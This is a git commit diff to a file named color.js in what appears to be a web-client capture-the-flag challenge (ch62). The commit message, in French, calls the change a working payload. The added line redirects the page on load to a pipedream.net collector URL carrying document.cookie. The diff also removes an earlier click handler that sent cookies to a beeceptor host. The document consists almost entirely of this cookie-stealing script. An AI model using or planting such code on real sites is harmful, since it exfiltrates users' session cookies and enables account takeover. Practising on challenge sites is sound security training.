ac865d771067703152de8ffd38a6a874da879ca5
MattSpeculoos <103248423+MattSpeculoos@users.noreply.github.com>
2024-10-23 07:46:53 +0200

    Update color.js
    payload fonctionnel

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,12 +1,8 @@
 const color = document.getElementById("color");
 const target = document.getElementById("result");
 
+window.location.href = "https://en32ycoo3ucod.x.pipedream.net/?cookie=".concat(document.cookie);
+
 function getRandomInt(max) {
     return Math.floor(Math.random() * max);
   }  
-
-color.onclick = () => {
-    document.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;
-    document.write('cookie: ' + document.cookie);
-    alert(2);
-}
